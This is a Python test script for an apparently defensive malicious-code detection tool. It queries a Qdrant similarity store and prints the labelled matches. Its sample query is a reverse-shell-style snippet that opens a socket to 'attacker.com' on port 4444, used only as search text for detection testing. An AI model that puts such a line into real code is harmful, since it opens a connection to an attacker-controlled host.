"""
Simple test for API RAG fix without Unicode issues.
"""

import os
import sys
from dotenv import load_dotenv

load_dotenv()

sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from scriptguard.config_loader import load_config
from scriptguard.rag.code_similarity_store import CodeSimilarityStore

def test_rag():
    print("\n" + "=" * 60)
    print("Testing RAG Search")
    print("=" * 60)

    config = load_config("config.yaml")
    qdrant_cfg = config.qdrant
    code_emb_cfg = config.code_embedding

    print(f"\nConfig:")
    print(f"  Collection: {qdrant_cfg.collection_name}")
    print(f"  Model: {qdrant_cfg.embedding_model}")

    store = CodeSimilarityStore(
        host=qdrant_cfg.host,
        port=qdrant_cfg.port,
        collection_name=qdrant_cfg.collection_name,
        embedding_model=qdrant_cfg.embedding_model,
        pooling_strategy=getattr(code_emb_cfg, 'pooling_strategy', 'mean_pooling'),
        normalize=getattr(code_emb_cfg, 'normalize', True),
        api_key=qdrant_cfg.api_key,
        use_https=qdrant_cfg.use_https,
        enable_chunking=False
    )

    info = store.get_collection_info()
    print(f"\nCollection Info:")
    print(f"  Points: {info.get('points_count')}")
    print(f"  Vector Size: {info.get('vector_size')}")

    # Test search
    query = "import socket; s = socket.socket(); s.connect(('attacker.com', 4444))"
    print(f"\nQuery: {query}")

    results = store.search_similar_code(
        query_code=query,
        k=3,
        balance_labels=False,
        enable_reranking=True,
        fetch_full_content=False,
        aggregate_chunks=True
    )

    print(f"\nResults: {len(results)}")
    for i, result in enumerate(results, 1):
        payload = result.get('payload', {})
        score = result.get('score', 0.0)
        label = payload.get('label', 'unknown')
        preview = payload.get('code_preview', '')[:60]

        print(f"\n  {i}. Score: {score:.4f} | Label: {label}")
        print(f"     Preview: {preview}...")

    if len(results) > 0:
        print("\nSUCCESS! RAG is working correctly.")
        return True
    else:
        print("\nFAILED! No results returned.")
        return False


if __name__ == "__main__":
    success = test_rag()
    sys.exit(0 if success else 1)